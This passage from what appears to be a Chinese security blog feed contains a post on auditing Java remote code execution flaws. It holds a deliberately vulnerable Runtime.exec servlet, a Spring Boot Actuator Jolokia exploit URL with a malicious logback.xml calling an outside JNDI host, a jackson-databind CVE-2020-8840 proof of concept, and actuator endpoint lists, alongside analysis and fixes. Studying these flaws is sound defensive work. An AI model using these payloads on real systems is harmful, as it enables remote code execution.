href="https://www.anquanke.com/post/id/188172" target="_blank" rel="noopener">SSTI/沙盒逃逸详细总结</a><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a><br>PHP方面：<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击 （SSTI）之浅析</a></p><p><strong>国外资料</strong></p><p>这篇总结的比较全面：<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">Server-Side Template Injection: RCE for the modern webapp</a><br>Python方面：<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">Jinja2 template injection filter bypasses</a></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.liangzl.com/get-article-detail-138970.html" target="_blank" rel="noopener">https://www.liangzl.com/get-article-detail-138970.html</a><br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a><br><a href="https://cert.360.cn/report/detail?id=6125d7f75170c309de1ffdde11f86355" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=6125d7f75170c309de1ffdde11f86355</a><br><a href="https://paper.seebug.org/1107/#41" target="_blank" rel="noopener">https://paper.seebug.org/1107/#41</a><br><a href="https://ackcent.com/blog/in-depth-freemarker-template-injection/" target="_blank" rel="noopener">https://ackcent.com/blog/in-depth-freemarker-template-injection/</a><br><a href="https://www.cnblogs.com/wade-luffy/p/5996848.html" target="_blank" rel="noopener">https://www.cnblogs.com/wade-luffy/p/5996848.html</a><br><a href="https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html" target="_blank" rel="noopener">https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html</a><br><a href="https://blog.csdn.net/weixin_38964895/article/details/81381060" target="_blank" rel="noopener">https://blog.csdn.net/weixin_38964895/article/details/81381060</a><br><a href="https://blog.csdn.net/sweety820/article/details/74347068?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/sweety820/article/details/74347068?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;为什么说Java审计南在SSTI呢？&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;现行SSTI(Server-Side Te
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java SSTI" scheme="http://yoursite.com/tags/Java-SSTI/"/>
    
  </entry>
  
  <entry>
    <title>春眠不觉晓，RCE知多少？</title>
    <link href="http://yoursite.com/2020/03/03/%E6%98%A5%E7%9C%A0%E4%B8%8D%E8%A7%89%E6%99%93%EF%BC%8CRCE%E7%9F%A5%E5%A4%9A%E5%B0%91%EF%BC%9F/"/>
    <id>http://yoursite.com/2020/03/03/%E6%98%A5%E7%9C%A0%E4%B8%8D%E8%A7%89%E6%99%93%EF%BC%8CRCE%E7%9F%A5%E5%A4%9A%E5%B0%91%EF%BC%9F/</id>
    <published>2020-03-03T04:42:16.000Z</published>
    <updated>2020-05-05T13:15:59.889Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>读者受众：所有人</li><li>阅读要求：30mins</li><li>文章中2620还没写完，清水川崎大佬就爆2634了，据说他还藏了很多个0day</li></ul><p><img src="https://img-blog.csdnimg.cn/20200303122905453.png" alt="在这里插入图片描述"></p><hr><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="简单案例分析RCE"><a href="#简单案例分析RCE" class="headerlink" title="简单案例分析RCE"></a>简单案例分析RCE</h2><p><img src="https://img-blog.csdnimg.cn/20200215130716340.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 通过Java执行系统命令，与cmd中或者终端上一样执行shell命令，最典型的用法就是使用Runtime.getRuntime().exec(command)或者new ProcessBuilder(cmdArray).start()。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞源码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">CommandExec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        String cmd = request.getParameter(<span class="string">"cmd"</span>).toString();</span><br><span class="line">        Runtime run = Runtime.getRuntime();</span><br><span class="line">        String lineStr = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process p = run.exec(cmd);</span><br><span class="line">            BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(p.getInputStream());</span><br><span class="line">            BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                lineStr += tmpStr + <span class="string">"\n"</span>;</span><br><span class="line">                System.out.println(tmpStr);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>漏洞成因分析</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: 开始获取cmd参数值</span><br><span class="line">e&#x3D;&gt;end: 输出返回值</span><br><span class="line">op1&#x3D;&gt;operation: 执行命令（过程类似Runtime.getRuntime().exec(command)）</span><br><span class="line">st-&gt;op1-&gt;e</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 流程图显示的代码执行的过程，不难发现我们没有看到过滤参数，判断参数是否输入正确的一系列操作，从而导致的<code>命令执行漏洞</code>。</p><p><strong>说明：</strong></p><ol><li>process指向一个本地进程，相对于main进程来说，process指向的称为子进程。<a href="https://blog.csdn.net/dataiyangu/article/details/83988654" target="_blank" rel="noopener">^1</a></li><li>BufferedInputStream 是缓冲输入流，它继承FilterInputStream类。BufferedInputStream 的作用是为另一个输入流添加一些功能，例如，提供“缓冲功能”以及支持“mark()标记”和“reset()重置方法”。BufferedInputStream 本质上是通过一个内部缓冲区数组实现的。例如，在新建某输入流对应的BufferedInputStream后，当我们通过read()读取输入流的数据时，BufferedInputStream会将该输入流的数据分批的填入到缓冲区中。每当缓冲区中的数据被读完之后，输入流会再次填充数据缓冲区；如此反复，直到我们读完输入流数据位置。[^2]</li></ol><hr><h2 id="知识内容补充"><a href="#知识内容补充" class="headerlink" title="知识内容补充"></a>知识内容补充</h2><p> <strong>继续阅读下面的内容，你需要补充更多知识。</strong></p><ol><li>Java序列化和反序列化</li><li>RMI、JRMP、JMX、JNDI</li><li>JNDI注入原理</li></ol><p>笔者在此，做一个简单介绍。</p><ul><li>Java序列化对象因其可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列化成Java对象而被非常频繁的被用于Socket传输。 在RMI(Java远程方法调用-Java Remote Method Invocation)和JMX(Java管理扩展-Java Management Extensions)服务中对象反序列化机制被强制性使用。在Http请求中也时常会被用到反序列化机制，如：直接接收序列化请求的后端服务、使用Base编码序列化字节字符串的方式传递等。</li><li>Java RMI用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。</li><li>JRMP（ Java Remote Method Protocol）协议通信，用于规范远程方法调用的协议</li><li>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</li><li>关于JNDI注入百度有很多文章，推荐<a href="https://www.freebuf.com/column/189835.html" target="_blank" rel="noopener">深入理解JNDI注入与Java反序列化漏洞利用</a>、<a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">JNDI注入原理及利用</a></li></ul><p><strong>推荐文章：</strong></p><ul><li><a href="https://javasec.org/javase/JavaDeserialization/Serialization.html" target="_blank" rel="noopener">Java 序列化/反序列化</a></li><li><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI</a></li><li><a href="https://xz.aliyun.com/t/7264" target="_blank" rel="noopener">搞懂RMI、JRMP、JNDI-终结篇</a></li><li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">MicroFocus研究论文(纯英文)</a></li><li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a></li></ul><hr><h2 id="Spring-Boot-Actuators-to-RCE"><a href="#Spring-Boot-Actuators-to-RCE" class="headerlink" title="Spring Boot Actuators to RCE"></a>Spring Boot Actuators to RCE</h2><p>&emsp;&emsp; Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。</p><p>&emsp;&emsp; 使用老外提供的源码，用mvn编译运行。<a href="https://github.com/veracode-research/actuator-testbed" target="_blank" rel="noopener">GitHub项目地址</a>直接访问<code>http://127.0.0.1:8090/jolokia/list</code><br>或者修改ip和端口<code>actuator-testbed\src\main\resources\application.properties</code></p><p><img src="https://img-blog.csdnimg.cn/20200225152718508.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225152401453.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228131827582.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 上面的<code>reloadByURL</code>可以加载一个外部URL进而重新加载日志配置，结果造成了RCE。我们需要构造一个恶意logback.xml的URL。<br><code>http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//下面是logback.xml内容</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">"rmi://artsploit.com:1389/jndi"</span> <span class="attr">as</span>=<span class="string">"appName"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>rmi和ldap服务都能触发这个漏洞，笔者在这里选择rmi服务。</p><p><img src="https://img-blog.csdnimg.cn/20200227143151844.gif" alt="在这里插入图片描述"><br><strong>简单的触发流程流程图：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: Spring-boot-actuator</span><br><span class="line">e&#x3D;&gt;end: RCE</span><br><span class="line">op&#x3D;&gt;operation: Jolokia</span><br><span class="line">op2&#x3D;&gt;operation: RMI</span><br><span class="line">cond&#x3D;&gt;condition: logback.xml?</span><br><span class="line"></span><br><span class="line">st-&gt;op-&gt;op2-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op2</span><br></pre></td></tr></table></figure><hr><p><strong>源码分析</strong></p><ol><li>第一步会先注册jolokia<br><img src="https://img-blog.csdnimg.cn/20200229132647972.png#pic_center" alt="在这里插入图片描述"></li><li><a href="http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml" target="_blank" rel="noopener">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml</a><br>看上面URL分析<code>reloadByURL</code>很重要，看一下源码<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reloadByURL</span><span class="params">(URL url)</span> <span class="keyword">throws</span> JoranException </span>&#123;</span><br><span class="line">       StatusListenerAsList statusListenerAsList = <span class="keyword">new</span> StatusListenerAsList();</span><br><span class="line"></span><br><span class="line">       addStatusListener(statusListenerAsList);</span><br><span class="line">       addInfo(<span class="string">"Resetting context: "</span> + loggerContext.getName());</span><br><span class="line">       loggerContext.reset();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// after a reset the statusListenerAsList gets removed as a listener</span></span><br><span class="line">       addStatusListener(statusListenerAsList);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (url != <span class="keyword">null</span>) &#123;</span><br><span class="line">               JoranConfigurator configurator = <span class="keyword">new</span> JoranConfigurator();</span><br><span class="line">               configurator.setContext(loggerContext);</span><br><span class="line">               configurator.doConfigure(url);</span><br><span class="line">               addInfo(<span class="string">"Context: "</span> + loggerContext.getName() + <span class="string">" reloaded."</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           removeStatusListener(statusListenerAsList);</span><br><span class="line">           <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">               StatusPrinter.print(statusListenerAsList.getStatusList());</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>不难发现下面三行代码是关键，重置日志配置。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addStatusListener(statusListenerAsList);</span><br><span class="line">      addInfo(<span class="string">"Resetting context: "</span> + loggerContext.getName());</span><br><span class="line">      loggerContext.reset();</span><br></pre></td></tr></table></figure></li></ol><p><strong>推荐文章</strong></p><p><a href="https://xz.aliyun.com/t/4258" target="_blank" rel="noopener">spring boot actuator rce via jolokia</a><br><a href="https://www.anquanke.com/post/id/173265" target="_blank" rel="noopener">Attack Spring Boot Actuator via jolokia Part 2</a><a href="https://xz.aliyun.com/t/4259" target="_blank" rel="noopener">关于此漏洞更多的骚操作参考</a></p><hr><p><strong>代码审计关键词</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">trace</span><br><span class="line">health</span><br><span class="line">loggers</span><br><span class="line">metrics</span><br><span class="line">autoconfig</span><br><span class="line">heapdump</span><br><span class="line">threaddump</span><br><span class="line">env</span><br><span class="line">info</span><br><span class="line">dump</span><br><span class="line">configprops</span><br><span class="line">mappings</span><br><span class="line">auditevents</span><br><span class="line">beans</span><br><span class="line">jolokia</span><br><span class="line">cloudfoundryapplication</span><br><span class="line">hystrix.stream</span><br><span class="line">actuator</span><br><span class="line">actuator&#x2F;auditevents</span><br><span class="line">actuator&#x2F;beans</span><br><span class="line">actuator&#x2F;health</span><br><span class="line">actuator&#x2F;conditions</span><br><span class="line">actuator&#x2F;configprops</span><br><span class="line">actuator&#x2F;env</span><br><span class="line">actuator&#x2F;info</span><br><span class="line">actuator&#x2F;loggers</span><br><span class="line">actuator&#x2F;heapdump</span><br><span class="line">actuator&#x2F;threaddump</span><br><span class="line">actuator&#x2F;metrics</span><br><span class="line">actuator&#x2F;scheduledtasks</span><br><span class="line">actuator&#x2F;httptrace</span><br><span class="line">actuator&#x2F;mappings</span><br><span class="line">actuator&#x2F;jolokia</span><br><span class="line">actuator&#x2F;hystrix.stream</span><br></pre></td></tr></table></figure><hr><p><strong>防护措施</strong><br>&emsp;&emsp; 在使用Actuator时，不正确的使用或者一些不经意的疏忽，就会造成严重的信息泄露等安全隐患。在代码审计时如果是springboot项目并且遇到actuator依赖，则有必要对安全依赖及配置进行复查。也可作为一条规则添加到黑盒扫描器中进一步把控。<br>&emsp;&emsp; 安全的做法是一定要引入security依赖，打开安全限制并进行身份验证。同时设置单独的Actuator管理端口并配置不对外网开放。<br>更多防护措施参考<a href="https://xz.aliyun.com/t/2233" target="_blank" rel="noopener">SpringBoot应用监控Actuator使用的安全隐患</a></p><hr><h2 id="CVE-2020-8840-FasterXML-jackson-databind-远程代码执行漏洞"><a href="#CVE-2020-8840-FasterXML-jackson-databind-远程代码执行漏洞" class="headerlink" title="CVE-2020-8840 FasterXML/jackson-databind 远程代码执行漏洞"></a>CVE-2020-8840 FasterXML/jackson-databind 远程代码执行漏洞</h2><p><strong>&emsp;&emsp; FasterXML/jackson-databind是一个用于JSON和对象转换的Java第三方库，可将Java对象转换成json对象和xml文档，同样也可将json对象转换成Java对象。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞POC</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        mapper.enableDefaultTyping();</span><br><span class="line"></span><br><span class="line">        String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\", &#123;\"asText\":\"ldap://localhost:1389/Exploit\"&#125;]"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            mapper.readValue(json, Object<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200227143135510.gif" alt="在这里插入图片描述"></p><hr><p>我们查看官方的漏洞源码提交修复记录<a href="https://github.com/FasterXML/jackson-databind/commit/914e7c9f2cb8ce66724bf26a72adc7e958992497" target="_blank" rel="noopener">GitHub地址</a>分析。<br><img src="https://img-blog.csdnimg.cn/20200302161840124.png" alt="在这里插入图片描述"></p><ul><li>查看POC ，找到JndiConverter类<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String json = <span class="string">"[\"org.apache.xbean.propertyeditor.JndiConverter\",&#123;\"asText\":\"ldap://localhost:1389/Exploit\"&#125;]"</span>;</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200302190911380.png" alt="在这里插入图片描述"></li><li>查看类的继承关系，找到AbstractConverter类</li></ul><p><img src="https://img-blog.csdnimg.cn/20200302191128920.png#pic_center" alt="在这里插入图片描述"></p><ul><li>找到toObject方法，证据不足，继续溯源。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">toObject</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.toObjectImpl(<span class="keyword">this</span>.trim ? text.trim() : text);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li>证据充分，此是内奸。重置text内容导致RCE。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setAsText</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.toObject(<span class="keyword">this</span>.trim ? text.trim() : text);</span><br><span class="line">        <span class="keyword">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20200302192146603.png" alt="在这里插入图片描述"></li></ul><hr><p><strong>思路整理</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: 开始</span><br><span class="line">e1&#x3D;&gt;end: 结束</span><br><span class="line">e2&#x3D;&gt;end: RCE</span><br><span class="line">op1&#x3D;&gt;operation: POC字符串</span><br><span class="line">op2&#x3D;&gt;operation: JndiConverter-&gt;toObjectImpl方法</span><br><span class="line">op3&#x3D;&gt;operation: AbstractConverter-&gt;setAsText方法</span><br><span class="line">op4&#x3D;&gt;operation: 请求ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit</span><br><span class="line">op5&#x3D;&gt;operation: Send LDAP reference result for Exploit redirecting to http:&#x2F;&#x2F;localhost:8080&#x2F;Exploit.class</span><br><span class="line">op6&#x3D;&gt;operation: http:&#x2F;&#x2F;localhost:8080&#x2F;Exploit.class</span><br><span class="line">cond&#x3D;&gt;condition: RCE？</span><br><span class="line"></span><br><span class="line">st-&gt;op1-&gt;op2-&gt;op3-&gt;cond-&gt;op4-&gt;op5-&gt;op6-&gt;e2</span><br><span class="line">cond(yes)-&gt;op4</span><br><span class="line">cond(no)-&gt;e1</span><br></pre></td></tr></table></figure><hr><p><strong>修复方式</strong><br>4. 升级 jackson-databind 至2.9.10.3、2.8.11.5、2.10.x<br>5. 排查项目中是否使用 xbean-reflect。该次漏洞的核心原因是xbean-reflect 中存在特殊的利用链允许用户触发 JNDI 远程类加载操作。将xbean-reflect移除可以缓解漏洞所带来的影响。</p><hr><h1 id="推荐几个历史版本RCE"><a href="#推荐几个历史版本RCE" class="headerlink" title="推荐几个历史版本RCE"></a>推荐几个历史版本RCE</h1><ol><li>com.threedr3am.bug.fastjson.FastjsonSerialize(TemplatesImpl) 利用条件：fastjson &lt;= 1.2.24 + Feature.SupportNonPublicField</li><li>com.threedr3am.bug.fastjson.NoNeedAutoTypePoc 利用条件：fastjson &lt; 1.2.48 不需要任何配置，默认配置通杀RCE</li><li>com.threedr3am.bug.fastjson.HikariConfigPoc(HikariConfig) 利用条件：fastjson &lt;= 1.2.59 RCE，需要开启AutoType</li><li>com.threedr3am.bug.fastjson.CommonsProxyPoc(SessionBeanProvider) 利用条件：fastjson &lt;= 1.2.61 RCE，需要开启AutoType</li><li>cas-4.1.x~4.1.6 反序列化漏洞（利用默认密钥）</li><li>cas-4.1.7~4.2.x 反序列化漏洞（需要知道加密key和签名key）</li></ol><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/JoyChou93/java-sec-code/wiki" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki</a><br><a href="http://www.jianfensec.com/70.html" target="_blank" rel="noopener">http://www.jianfensec.com/70.html</a><br><a href="https://www.cnblogs.com/tr1ple/p/12348886.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/12348886.html</a><br>[^2]: <a href="https://www.cnblogs.com/isme-zjh/p/11506495.html" target="_blank" rel="noopener">https://www.cnblogs.com/isme-zjh/p/11506495.html</a><br><a href="https://github.com/jas502n/CVE-2020-8840" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2020-8840</a><br><a href="https://github.com/fairyming/CVE-2020-8840" target="_blank" rel="noopener">https://github.com/fairyming/CVE-2020-8840</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;读者受众：所有人&lt;/li&gt;
&lt;li&gt;阅读要求：30mins&lt;/li&gt;
&lt;li&gt;文章中2620还没写完，清水川崎大佬就爆2634了
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="JavaRCE" scheme="http://yoursite.com/tags/JavaRCE/"/>
    
  </entry>
  
  <entry>
    <title>CNVD-2020-10487(CVE-2020-1938)tomcat ajp 文件读取漏洞</title>
    <link href="http://yoursite.com/2020/02/23/CNVD-2020-10487(CVE-2020-1938)tomcat%20ajp%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/02/23/CNVD-2020-10487(CVE-2020-1938)tomcat%20ajp%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-02-23T11:01:42.000Z</published>
    <updated>2020-05-05T13:12:11.954Z</updated>
    
